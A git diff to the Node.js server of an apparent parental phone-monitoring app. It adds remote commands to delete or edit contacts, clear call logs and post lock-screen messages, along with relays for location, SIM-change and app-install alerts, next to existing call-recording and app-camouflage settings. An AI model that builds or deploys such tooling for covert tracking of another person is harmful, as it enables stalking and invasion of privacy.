@@ -196,7 +196,15 @@ const COMMAND_EVENTS = {
   'sos-config': 'SOS_CONFIG_COMMAND',
   'call-recording-config': 'CALL_RECORDING_CONFIG_COMMAND',
   'camouflage-config': 'CAMOUFLAGE_CONFIG_COMMAND',
-  'quick-setting': 'QUICK_SETTING_COMMAND'
+  'quick-setting': 'QUICK_SETTING_COMMAND',
+  'open-app': 'OPEN_APP_COMMAND',
+  'pause-monitoring': 'PAUSE_MONITORING_COMMAND',
+  'delete-contact': 'DELETE_CONTACT_COMMAND',
+  'edit-contact': 'EDIT_CONTACT_COMMAND',
+  'delete-call': 'DELETE_CALL_COMMAND',
+  'clear-calls': 'CLEAR_CALLS_COMMAND',
+  'lock-screen-message': 'LOCK_SCREEN_MESSAGE_COMMAND',
+  'storage-analysis': 'STORAGE_ANALYSIS_REQUEST'
 };
 
 /** Builds the phone payload for a REST command (1:1 mapping for most). */
@@ -344,6 +352,14 @@ function commandPayload(name, body = {}) {
       mode: body.mode,
       payload: body.payload || {}
     };
+    case 'open-app': return {};
+    case 'pause-monitoring': return { paused: !!body.paused };
+    case 'delete-contact': return { contactId: body.contactId };
+    case 'edit-contact': return { contactId: body.contactId, name: body.name, number: body.number };
+    case 'delete-call': return { callId: body.callId };
+    case 'clear-calls': return {};
+    case 'lock-screen-message': return { title: body.title || 'Message from Parents', message: body.message || '' };
+    case 'storage-analysis': return {};
     default: return {};
   }
 }
@@ -437,10 +453,16 @@ function persistDevice(device) {
 wss.on('connection', (ws) => {
   const clientId = randomUUID();
   ws.clientId = clientId;
+  ws.isAlive = true;
   clients.set(clientId, ws);
   console.log(`[ws] client connected: ${clientId} (total ${clients.size})`);
 
+  ws.on('pong', () => {
+    ws.isAlive = true;
+  });
+
   ws.on('message', (raw) => {
+    ws.isAlive = true;
     let rawMsg;
     try {
       rawMsg = JSON.parse(raw.toString());
@@ -469,6 +491,21 @@ wss.on('connection', (ws) => {
     console.log(`[ws] client disconnected: ${clientId} (total ${clients.size})`);
   });
 });
+
+// Stale connection watchdog: sweeps every 15s. Disconnects dead sockets immediately!
+const heartbeatInterval = setInterval(() => {
+  for (const [clientId, ws] of clients) {
+    if (ws.isAlive === false) {
+      console.log(`[ws] terminating stale/unresponsive connection: ${clientId}`);
+      ws.terminate();
+      continue;
+    }
+    ws.isAlive = false;
+    try {
+      ws.ping();
+    } catch (_) {}
+  }
+}, 15000);
 
 function handleMessage(ws, msg) {
   const payload = msg.payload || {};
@@ -809,8 +846,29 @@ function handleMessage(ws, msg) {
     case 'CALL_RECORDING_SAVED':
     case 'CAMOUFLAGE_STATUS':
     case 'QUICK_SETTING_STATUS':
+    case 'SPEED_ALERT':
+    case 'EMERGENCY_BATTERY_LOCATION':
+    case 'SIM_CHANGED_ALERT':
+    case 'DELETE_CONTACT_RESULT':
+    case 'EDIT_CONTACT_RESULT':
+    case 'DELETE_CALL_RESULT':
+    case 'CLEAR_CALLS_RESULT':
+    case 'LOCK_SCREEN_MESSAGE_RESULT':
+    case 'STORAGE_ANALYSIS_RESPONSE':
+    case 'APP_INSTALL_EVENT':
       broadcastToDashboard(msg.event, payload);
       break;
+
+    case 'MONITORING_PAUSED_STATUS': {
+      const { deviceId, paused } = payload;
+      if (deviceId) {
+        if (!db.data.monitoringPaused) db.data.monitoringPaused = {};
+        db.data.monitoringPaused[deviceId] = !!paused;
+        db.write();
+      }
+      broadcastToDashboard('MONITORING_PAUSED_STATUS', payload);
+      break;
+    }
 
     case 'SYNC_CONFIG_STATUS': {
       const { deviceId } = payload;
@@ -895,14 +953,19 @@ app.get('/api/health', (req, res) => res.json({ ok: true }));
 
 app.get('/api/devices', (req, res) => {
   res.json(
-    db.data.devices.map((d) => ({
-      id: d.id,
-      name: d.deviceName,
-      battery: d.battery,
-      charging: d.isCharging,
-      last_seen: d.lastSeen,
-      online: devices.has(d.id) && devices.get(d.id).wsClientId != null
-    }))
+    db.data.devices.map((d) => {
+      const dev = devices.get(d.id);
+      const isOnline = dev && dev.wsClientId != null && (Date.now() - (d.lastSeen || 0) < 35000);
+      return {
+        id: d.id,
+        name: d.deviceName,
+        battery: d.battery,
+        charging: d.isCharging,
+        last_seen: d.lastSeen,
+        online: !!isOnline,
+        monitoringPaused: !!(db.data.monitoringPaused && db.data.monitoringPaused[d.id])
+      };
+    })
   );
 });
 
